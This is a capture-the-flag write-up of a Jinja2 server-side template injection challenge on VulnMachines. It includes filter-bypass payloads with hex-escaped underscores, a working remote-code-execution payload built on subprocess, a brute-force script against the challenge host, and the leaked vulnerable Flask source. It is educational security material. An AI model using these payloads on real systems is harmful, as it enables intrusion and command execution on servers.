### Server Side Template Injection

<h3> VulnMachines SSTI </h3>
  
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5ba69ce8-7c1d-4b12-acd4-ac938cc0a05a)

After going over to the web page it shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3f12114e-5007-40e8-872c-0852bc94afe7)

Trying to input something shows it get reflected back
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6b197aee-aeec-4a59-ae29-fdf22ae038e5)

Using basic SSTI payload works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0c3d4f0d-3339-4052-a5ff-80a80299048d)

Let's use this SSTI check to know what template engine it uses
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/72ceb69f-0749-42af-a825-e578cbcceee7)

First i'll try `${7*7}` but it doesn't get evaluated
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fca6e016-516e-4d4e-99eb-f2f51a177d5a)

Next we move unto the down part of what we are using to get the template engine

Now i'll try this `{{7*7}}`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/40a994fe-f655-4155-b869-57472c9ee536)

It gets evaluated

So we move unto `{{7*'7'}}`

But doing that gives us an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/727b0876-0742-4285-b9aa-90f9ffa334b7)

```
Your nickname contains restricted characters!
```

To bypass this we can try using double quote instead of single quote

Doing that works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1cd3936c-6e86-445b-ad6a-3162ba396fbd)

From here we can say the template engine is either *Jinja2 or Twig*

But from the web server header we can then conclude it's *Jinja2* templating engine that is being used since the webserver is built on python
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/f1e4fd74-e41d-4cc8-8bff-b980e4cf0796)

The aim of this challenge is to get the flag 

Checking the {{config}} env works and shows the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/4ad45aa4-090f-4af8-9756-dda57100a7d7)

```
Flag: 56756c6e6d616368696e6573202d20506c61636520666f722050656e746573657273
```

It is in it's hex form

I used python to decode it

```
#!/usr/bin/python3
# Author: Hack.You

encoded = '56756c6e6d616368696e6573202d20506c61636520666f722050656e746573657273'
decoded = bytes.fromhex(encoded)
flag = b'vnm{'+decoded+b'}'
print(f'Flag: {flag}')
```

Running it gives us the flag
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e81b6b1e-30d0-4f84-a5f3-82486aa33f81)

But how about we try get RCE

First I need to know the classes that are present and preferably the subprocess class

Reason is because it's a python module that allows us to execute commands
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dbe5deff-2bf0-4f45-822f-f50bfc2397fe)

So here's the payload:

```
{{""|attr("__class__")|attr("__base__")|attr("__subclasses__")()}}
```

But giving that to the web server gives an error
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/53ac6936-426d-43c6-81c8-6a9177046c78)

```
Your nickname contains restricted characters!
```

It seems like it filters another character 

To make it easier i'll intercept one of the post request and save it in a file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6410d653-91b7-4369-bd27-b95cea534ad1)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/bc21fc54-736c-4da6-aa63-c70a73ff25ad)

Now i'll use ffuf to fuzz for allowed special characters
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/51b0b6af-5d24-475b-9c87-54d7361592ba)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1260f974-8e17-4d44-bcee-3b0d2a161e9c)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2e5bc423-bfad-4f9b-ac47-033ca5b6e72c)

Sorry about the way my ffuf is that's the new update 😥

But we can see the allowed characters :)

One way we can improvise in bypassing the filter is by converting the blacklisted character to hex
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/2155b706-5ad1-4fa6-a80d-5ae9297da27a)

Using the updated payload works 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5e6054cd-da25-4b31-a12c-d1b2a2afd8fe)

Now we can check if the subprocess class is among it
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/b19d4d65-bc52-4985-a927-6eda3d9984f0)

Cool it's among the classes

So the final payload should be:

```
{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(position_of_subprocess_number))("cat+app\x2epy",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}
```

We need to get the position of the subprocess class number

Burp intruder can help with that :) i did try scripting this but unfortunately  i can't seem to make it send as raw data without it being converted to it's string form

```python
# Under dev
import requests

def main():

    url = 'http://hackme2.vulnmachines.com:8470/'

    for i in range(1000):
        
        data = {
            'nickname': '{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")({})("id",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}'.format(i)
        }
        
        reqStatusCode = requests.post(url, data=data).status_code

        if reqStatusCode == 200:
            print(f'[+] Subprocess position found at: {i}')


if __name__ == '__main__':
    main()
```

I'll just fuzz using Burp Intruder
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/04ec0628-1e92-44aa-99bd-a3c99e4f08bb)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dc6c8896-3442-4ce3-8d02-75a0f544a6c4)

After running it I got this 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/52b7ad19-eb4f-419e-ba69-ed57e89e5e1b)

We can see the request with a content length of `258`

Checking it shows that it indeed works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/083c3b19-7840-4ecb-a003-1496c2233df9)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/11c50698-5687-49b5-bb7f-b251fed673c5)

And the position for the subprocess class is `286`

We can then try reading the app.py file
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3062bfcd-5b67-4dee-b0ae-ba63e7ef6667)

```
{{""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()|attr("\x5f\x5fgetitem\x5f\x5f")(286)("cat+app\x2epy",shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5fgetitem\x5f\x5f")(0)|attr("strip")()}}
```

Here's the result gotten from reading app.py (P.S: I exfiltrated it 🙂)

```python
import random
from flask import Flask, render_template_string, render_template, request

app = Flask(__name__)
app.config['SECRET_KEY'] = 'Follow us on Twitter rapidsafeguard'

#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe
'''
def encode(line, key, key2):
    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))

app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')
'''

app.config['flag'] = '56756c6e6d616368696e6573202d20506c61636520666f722050656e746573657273'
#app.config['flag']="Success fully pass SSTI"
nicknames = ['˜”*°★☆★_%s_★☆★°°*', '%s ~♡ⓛⓞⓥⓔ♡~', '%s Вêчңø в øĤлâйĤé', '♪ ♪ ♪ %s ♪ ♪ ♪ ', '[♥♥♥%s♥♥♥]', '%s, kOтO®Aя )(оТеЛ@ ©4@$tьЯ', '♔%s♔', '[♂+♂=♥]%s[♂+♂=♥]']
#nicknames=['psycho','rapidsafeguard']
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        try:
            p = request.values.get('nickname')
            id = random.randint(0, len(nicknames) - 1)
            if p != None:
                if '.' in p or '_' in p or '\'' in p:
                    return 'Your nickname contains restricted characters!'
                return render_template_string(nicknames[id] % p)

        except Exception as e:
            print(e)
            return 'Exception'

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

We can also see the flag there 😅

And we're done 👻
